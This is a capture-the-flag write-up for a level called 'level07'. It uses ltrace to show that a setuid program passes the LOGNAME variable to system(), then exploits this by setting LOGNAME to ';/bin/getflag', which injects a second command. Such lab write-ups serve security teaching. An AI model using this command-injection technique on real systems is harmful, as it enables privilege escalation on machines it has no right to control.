## Level07
### Description
The level 07 user has an executable **level07**,  which user is `flag07`.

## Solution
- Thanks to ltrace we know that the environement variable LOGNAME is used .<br>We need to modifie it to execute getflag in the program.

```bash
ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                      = 2007
geteuid()                                          = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                         = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                         = 0
getenv("LOGNAME")                                                                           = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff48, 0xb7e5ee55, 0xb7fed280)                         = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                      = 0
+++ exited (status 0) +++
```

- We change the value of LOGNAME as :
`LOGNAME=';/bin/getflag'`

- When execute now `./level07` show the flag.
